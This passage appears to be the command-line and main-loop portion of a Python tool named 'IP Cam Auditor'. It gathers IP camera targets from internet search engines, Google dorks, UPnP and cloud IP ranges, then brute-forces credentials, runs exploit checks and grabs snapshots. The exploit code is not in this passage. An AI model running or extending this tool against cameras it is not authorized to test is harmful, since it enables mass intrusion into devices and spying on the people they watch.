        print(blue("[*] Discovering UPnP devices on local network..."))
        devices = upnp_discover(timeout=5)
        if devices:
            targets = []
            for d in devices:
                loc = d.get("location", "")
                parsed = urllib.parse.urlparse(loc)
                port = parsed.port or 80
                targets.append((d["ip"], port))
            print(green(f"[+] Found {len(targets)} UPnP devices"))
            return targets
        else:
            print(red("[-] No UPnP devices found"))
            return []
    elif choice == "10":
        port = int(input(f"{cyan('[?]')} Port to scan on cloud ranges [80]: ").strip() or "80")
        max_targets = int(input(f"{cyan('[?]')} Max targets (0 = all, may be huge) [100]: ").strip() or "100")
        targets = []
        for cidr in CLOUD_RANGES:
            if max_targets and len(targets) >= max_targets:
                break
            network = ipaddress.IPv4Network(cidr, strict=False)
            for ip in network.hosts():
                if max_targets and len(targets) >= max_targets:
                    break
                targets.append((str(ip), port))
        print(green(f"[+] Generated {len(targets)} cloud targets (from {len(CLOUD_RANGES)} ranges)"))
        return targets
    elif choice == "11":
        filename = input(f"{cyan('[?]')} File path (one IP or IP:port per line): ").strip()
        targets = []
        try:
            with open(filename) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if ":" in line:
                            ip, port = line.rsplit(":", 1)
                            targets.append((ip.strip(), int(port.strip())))
                        else:
                            targets.append((line, 80))
            print(green(f"[+] Loaded {len(targets)} targets from {filename}"))
            return targets
        except Exception as e:
            print(red(f"[-] Error loading file: {e}"))
            return []
    else:
        print(red("[-] Invalid choice"))
        return []


# ──────────────────────────────────────────────
# Main CLI
# ──────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="IP Cam Auditor v4.0 — Ultimate IP Camera Security Auditor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
Examples:
  %(prog)s scan 192.168.1.0/24              # Scan local network
  %(prog)s scan 192.168.1.0/24 --exploits   # Include exploit checks
  %(prog)s scan 192.168.1.0/24 --snapshot   # Capture snapshots
  %(prog)s single 192.168.1.100:80          # Single target audit
  %(prog)s remote 203.0.113.50:8080         # Remote target via port forward
  %(prog)s domain camera.example.com:554    # DNS/DDNS resolution
  %(prog)s shodan "Hikvision port:80" --shodan-key KEY
  %(prog)s censys "services.service_name:HTTP" --censys-id ID --censys-secret SECRET
  %(prog)s fofa 'title="HIKVISION"' --fofa-email EMAIL --fofa-key KEY
  %(prog)s zoomeye "Hikvision country:IT" --zoomeye-key KEY
  %(prog)s dorks --google-key KEY --google-cx CX
  %(prog)s upnp                                   # UPnP discovery
  %(prog)s clouds                                  # Cloud IP range scan
  %(prog)s wizard                                  # Interactive wizard
  %(prog)s list targets.txt                        # Load targets from file
  %(prog)s quick 192.168.1.0/24                   # Quick scan (port 80 only)
        """)
    )
    
    parser.add_argument("mode", nargs="?", default="wizard",
                        help="Mode: scan, single, remote, domain, shodan, censys, "
                             "fofa, zoomeye, dorks, upnp, clouds, cloud, "
                             "list, quick, wizard (default)")
    parser.add_argument("target", nargs="?",
                        help="Target: CIDR, IP, IP:port, domain, Shodan/Fofa/Censys query, or file path")
    
    # Connection options
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=8,
                        help="Connection timeout in seconds (default: 8)")
    parser.add_argument("--threads", type=int, default=50,
                        help="Thread count for port scanning (default: 50)")
    
    # Auth options
    parser.add_argument("--user", help="Single username to test")
    parser.add_argument("--password", help="Single password to test (use with --user)")
    parser.add_argument("--creds", action="append", default=[],
                        help="Additional credentials in user:pass format (can be repeated)")
    
    # Feature toggles
    parser.add_argument("--exploits", action="store_true",
                        help="Run exploit/CVE checks")
    parser.add_argument("--snapshot", action="store_true",
                        help="Attempt snapshot capture from vulnerable cameras")
    parser.add_argument("--telnet-brute", action="store_true",
                        help="Brute-force telnet logins")
    parser.add_argument("--no-rtsp", action="store_true",
                        help="Skip RTSP checks")
    
    # Output options
    parser.add_argument("-o", "--output", help="Output directory for reports and snapshots")
    parser.add_argument("-f", "--format", choices=["txt", "html", "csv", "all"], default="all",
                        help="Report format(s) (default: all)")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Minimal output (suppress banner and progress)")
    
    # API keys
    parser.add_argument("--shodan-key", help="Shodan API key")
    parser.add_argument("--censys-id", help="Censys API ID")
    parser.add_argument("--censys-secret", help="Censys API Secret")
    parser.add_argument("--fofa-email", help="FOFA email")
    parser.add_argument("--fofa-key", help="FOFA key")
    parser.add_argument("--zoomeye-key", help="ZoomEye API key")
    parser.add_argument("--google-key", help="Google API key")
    parser.add_argument("--google-cx", help="Google Custom Search CX")
    
    return parser.parse_args()


def main():
    args = parse_args()
    
    if not args.quiet:
        print(cyan(BANNER))
        print(f"  {blue('[*]')} Date: {timestamp()}")
        print(f"  {blue('[*]')} OpenCV: {'✓' if HAS_OPENCV else '✗ (pip install opencv-python)'}")
        print(f"  {blue('[*]')} ONVIF: {'✓' if HAS_ONVIF else '✗ (pip install onvif-zeep)'}")
        print(f"  {blue('[*]')} dnspython: {'✓' if HAS_DNSPYTHON else '✗ (pip install dnspython)'}")
        print(f"  {blue('[*]')} Requests: {'✓' if HAS_REQUESTS else '✗ (pip install requests)'}")
        print(f"  {blue('[*]')} aiohttp: {'✓' if HAS_AIOHTTP else '✗ (pip install aiohttp)'}")
        print()
    
    # Build targets list
    targets = []
    mode = args.mode.lower()
    target_arg = args.target
    
    if mode == "wizard":
        print(cyan("[*] Starting interactive discovery wizard...\n"))
        targets = discovery_wizard(args)
        if not targets:
            print(yellow("[!] No targets selected. Exiting."))
            return
    elif mode in ("scan", "quick"):
        if not target_arg:
            print(red("[-] CIDR range required (e.g., 192.168.1.0/24)"))
            sys.exit(1)
        try:
            network = ipaddress.IPv4Network(target_arg, strict=False)
            port = 80 if mode == "quick" else None
            if port:
                targets = [(str(ip), port) for ip in network.hosts()]
            else:
                targets = [(str(ip), None) for ip in network.hosts()]
        except ValueError:
            print(red(f"[-] Invalid CIDR: {target_arg}"))
            sys.exit(1)
    elif mode == "single":
        try:
            if ":" in target_arg:
                ip, port = target_arg.rsplit(":", 1)
                targets = [(ip.strip(), int(port.strip()))]
            else:
                targets = [(target_arg, 80)]
        except Exception as e:
            print(red(f"[-] Invalid target: {e}"))
            sys.exit(1)
    elif mode == "remote":
        try:
            if ":" in target_arg:
                ip, port = target_arg.rsplit(":", 1)
                targets = [(ip.strip(), int(port.strip()))]
            else:
                print(red("[-] Remote target requires IP:port format (e.g., 203.0.113.50:8080)"))
                sys.exit(1)
        except Exception as e:
            print(red(f"[-] Invalid remote target: {e}"))
            sys.exit(1)
    elif mode == "domain":
        try:
            domain_part = target_arg
            port = 80
            if ":" in target_arg:
                domain_part, port_str = target_arg.rsplit(":", 1)
                port = int(port_str)
            
            print(blue(f"[*] Resolving domain {domain_part}..."))
            ips = resolve_domain(domain_part)
            if ips:
                print(green(f"[+] Resolved → {', '.join(ips)}"))
                targets = [(ip, port) for ip in ips]
            else:
                print(red(f"[-] Could not resolve {domain_part}"))
                sys.exit(1)
        except Exception as e:
            print(red(f"[-] Domain error: {e}"))
            sys.exit(1)
    elif mode == "shodan":
        if not args.shodan_key:
            print(red("[-] Shodan API key required (--shodan-key KEY)"))
            sys.exit(1)
        if not target_arg:
            print(red("[-] Shodan search query required"))
            sys.exit(1)
        try:
            import shodan  # type: ignore
        except ImportError:
            print(red("[-] shodan package not installed. pip install shodan"))
            sys.exit(1)
        
        print(blue(f"[*] Searching Shodan for: {target_arg}"))
        api = shodan.Shodan(args.shodan_key)
        try:
            results = api.search(target_arg)
            for r in results.get("matches", []):
                ip = r.get("ip_str", "")
                for p in r.get("ports", [80, 443, 554, 8080]):
                    targets.append((ip, p))
            print(green(f"[+] Shodan returned {len(results.get('matches', []))} results → {len(targets)} targets"))
        except Exception as e:
            print(red(f"[-] Shodan error: {e}"))
            sys.exit(1)
    elif mode == "censys":
        if not args.censys_id or not args.censys_secret:
            print(red("[-] Censys API ID and Secret required (--censys-id ID --censys-secret SECRET)"))
            sys.exit(1)
        if not target_arg:
            print(red("[-] Censys search query required"))
            sys.exit(1)
        print(blue(f"[*] Searching Censys for: {target_arg}"))
        result = search_censys(target_arg, args.censys_id, args.censys_secret)
        if "results" in result:
            for r in result["results"]:
                ip = r.get("ip", "")
                services = r.get("services", [{"port": 80}])
                for svc in services:
                    targets.append((ip, svc.get("port", 80)))
            print(green(f"[+] Censys returned {result['count']} results → {len(targets)} targets"))
        else:
            print(red(f"[-] {result.get('error', 'Unknown error')}"))
            sys.exit(1)
    elif mode == "fofa":
        if not args.fofa_email or not args.fofa_key:
            print(red("[-] FOFA email and key required (--fofa-email EMAIL --fofa-key KEY)"))
            sys.exit(1)
        if not target_arg:
            print(red("[-] FOFA search query required"))
            sys.exit(1)
        print(blue(f"[*] Searching FOFA for: {target_arg}"))
        result = search_fofa(target_arg, args.fofa_email, args.fofa_key)
        if "results" in result:
            for r in result["results"]:
                if len(r) >= 2:
                    targets.append((str(r[0]), int(r[1]) if str(r[1]).isdigit() else 80))
            print(green(f"[+] FOFA returned {result['count']} results → {len(targets)} targets"))
        else:
            print(red(f"[-] {result.get('error', 'Unknown error')}"))
            sys.exit(1)
    elif mode == "zoomeye":
        if not args.zoomeye_key:
            print(red("[-] ZoomEye API key required (--zoomeye-key KEY)"))
            sys.exit(1)
        if not target_arg:
            print(red("[-] ZoomEye search query required"))
            sys.exit(1)
        print(blue(f"[*] Searching ZoomEye for: {target_arg}"))
        result = search_zoomeye(target_arg, args.zoomeye_key)
        if "results" in result:
            for r in result["results"]:
                ip = r.get("ip", "")
                port_info = r.get("portinfo", {})
                port = port_info.get("port", 80)
                targets.append((ip, port))
            print(green(f"[+] ZoomEye returned {result['count']} results → {len(targets)} targets"))
        else:
            print(red(f"[-] {result.get('error', 'Unknown error')}"))
            sys.exit(1)
    elif mode in ("dorks", "dork"):
        if not args.google_key or not args.google_cx:
            print(red("[-] Google API key and CX required (--google-key KEY --google-cx CX)"))
            sys.exit(1)
        print(blue("[*] Running Google dork searches..."))
        results = run_all_google_dorks(args.google_key, args.google_cx, timeout=args.timeout)
        for r in results:
            link = r.get("link", "")
            parsed = urllib.parse.urlparse(link)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            if host:
                try:
                    socket.inet_aton(host)
                    targets.append((host, port))
                except OSError:
                    pass
        print(green(f"[+] Dork search found {len(targets)} targets"))
    elif mode == "upnp":
        print(blue("[*] Discovering UPnP devices..."))
        devices = upnp_discover(timeout=args.timeout)
        if devices:
            for d in devices:
                loc = d.get("location", "")
                parsed = urllib.parse.urlparse(loc)
                port = parsed.port or 80
                targets.append((d["ip"], port))
            print(green(f"[+] Found {len(targets)} UPnP devices"))
        else:
            print(yellow("[-] No UPnP devices found"))
            sys.exit(1)
    elif mode in ("clouds", "cloud"):
        port = 80
        max_targets = 200
        for cidr in CLOUD_RANGES:
            if len(targets) >= max_targets:
                break
            network = ipaddress.IPv4Network(cidr, strict=False)
            for ip in network.hosts():
                if len(targets) >= max_targets:
                    break
                targets.append((str(ip), port))
        print(green(f"[+] Generated {len(targets)} cloud targets"))
    elif mode == "list":
        if not target_arg:
            print(red("[-] File path required"))
            sys.exit(1)
        try:
            with open(target_arg) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if ":" in line:
                            ip, port = line.rsplit(":", 1)
                            targets.append((ip.strip(), int(port.strip())))
                        else:
                            targets.append((line, 80))
            print(green(f"[+] Loaded {len(targets)} targets from {target_arg}"))
        except Exception as e:
            print(red(f"[-] Error loading file: {e}"))
            sys.exit(1)
    else:
        print(red(f"[-] Unknown mode: {mode}"))
        print(blue("[*] Use 'wizard' for interactive mode, or -h for help"))
        sys.exit(1)
    
    if not targets:
        print(yellow("[!] No targets to scan. Exiting."))
        return
    
    # If no port specified and in scan mode, detect ports on each host first
    if mode == "scan" and any(t[1] is None for t in targets):
        print(cyan("\n[*] Phase 1: Port scanning targets...\n"))
        updated_targets = []
        for ip, _ in targets:
            open_ports = scan_ports_sync(ip, COMMON_PORTS, timeout=args.timeout, threads=args.threads)
            if open_ports:
                for p in open_ports:
                    updated_targets.append((ip, p))
                print(f"  {green('[+]')} {ip}: {', '.join(str(p) for p in sorted(open_ports))}")
            else:
                print(f"  {yellow('[-]')} {ip}: no common ports open")
        targets = updated_targets
        print(f"\n{blue('[*]')} Found {len(targets)} open port(s) across targets\n")
    
    # Handle single credential shortcut
    if args.user:
        pwd = args.password or ""
        args.creds.insert(0, f"{args.user}:{pwd}")
    
    # Report data collection
    report_data = []
    
    # Display target summary
    print(cyan(f"[*] Auditing {len(targets)} target(s)...\n"))
    
    # Audit each target
    try:
        for i, (ip, port) in enumerate(targets, 1):
            print(f"{cyan(f'[{i}/{len(targets)}]')} Auditing {ip}:{port}")
            result = audit_camera(ip, port, args, report_data)
            if result is None:
                print(f"  {yellow('[-]')} Skipped (port closed)")
    except KeyboardInterrupt:
        print(f"\n{yellow('[!]')} Interrupted by user. Generating partial report...")
    
    # Generate reports
    print(f"\n{cyan('=' * 60)}")
    print(cyan("[*] Generating reports..."))
    
    output_dir = args.output or "ipcam_reports"
    os.makedirs(output_dir, exist_ok=True)
    
    vulnerable_count = len([r for r in report_data if r["credentials_found"] or r["exploits_found"]])
    total_creds = sum(len(r["credentials_found"]) for r in report_data)
    total_exploits = sum(len(r["exploits_found"]) for r in report_data)
    
    generated_files = []
    
    if args.format in ("txt", "all"):
        fname = generate_text_report(report_data, f"{output_dir}/report_{ts_filename()}.txt")
        generated_files.append(fname)
    
    if args.format in ("html", "all"):
        fname = generate_html_report(report_data, f"{output_dir}/report_{ts_filename()}.html")
        generated_files.append(fname)
    
    if args.format in ("csv", "all"):
        fname = generate_csv_report(report_data, f"{output_dir}/report_{ts_filename()}.csv")
        generated_files.append(fname)
    
    # Print final summary
    print(f"\n{green('=' * 60)}")
    print(green(f"  SCAN COMPLETE"))
    print(green(f"{'=' * 60}"))
    print(f"  Targets audited: {len(report_data)}")
    print(f"  Vulnerable:      {vulnerable_count}")
    print(f"  Credentials:     {total_creds}")
    print(f"  Exploits:        {total_exploits}")
    print(f"  Reports saved:")
    for f in generated_files:
        print(f"    • {f}")
    print()


if __name__ == "__main__":
    main()
